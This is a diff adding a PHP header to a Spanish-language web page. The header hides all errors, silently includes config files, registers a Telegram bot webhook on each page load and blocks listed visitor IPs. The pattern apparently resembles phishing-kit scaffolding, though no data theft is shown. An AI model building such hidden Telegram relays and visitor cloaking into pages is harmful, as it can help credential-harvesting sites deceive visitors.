@@ -1,3 +1,59 @@
+<?php
+ini_set('display_errors', '0');
+ini_set('display_startup_errors', '0');
+error_reporting(0);
+ob_start();
+
+
+@include_once __DIR__ . '/limpiar_requests.php';
+@include_once __DIR__ . '/config.php';
+
+
+if (!isset($bot_token_2, $webhook_url)) {
+    exit;
+}
+
+
+$setWebhookUrl = sprintf(
+    "https://api.telegram.org/bot%s/setWebhook?url=%s",
+    urlencode($bot_token_2),
+    urlencode($webhook_url)
+);
+
+$response = @file_get_contents($setWebhookUrl);
+
+
+$result = [];
+if ($response !== false) {
+    $decoded = @json_decode($response, true);
+    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
+        $result = $decoded;
+    }
+}
+
+// 🚫 Bloqueo de IPs no autorizadas
+$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
+$user_ip = explode(',', $user_ip)[0];
+$user_ip = trim($user_ip);
+
+// Lista de IPs bloqueadas (agrega según sea necesario)
+$ips_bloqueadas = ["---", "---"];
+
+if (in_array($user_ip, $ips_bloqueadas, true)) {
+    header("HTTP/1.1 403 Forbidden");
+    exit;
+}
+
+ob_end_clean();
+?>
+<!--
+██████╗ ██╗  ██╗██████╗      ██████╗  ██████╗ ████████╗██╗   ██╗
+██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██╔═══██╗╚══██╔══╝╚██╗ ██╔╝
+██████╔╝███████║██████╔╝    ██║  ███╗██║   ██║   ██║    ╚████╔╝ 
+██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║██║   ██║   ██║     ╚██╔╝  
+██║     ██║  ██║██║         ╚██████╔╝╚██████╔╝   ██║      ██║   
+╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝  ╚═════╝    ╚═╝      ╚═╝ 
+-->
 <!DOCTYPE html>
 <html lang="es">
 <head>
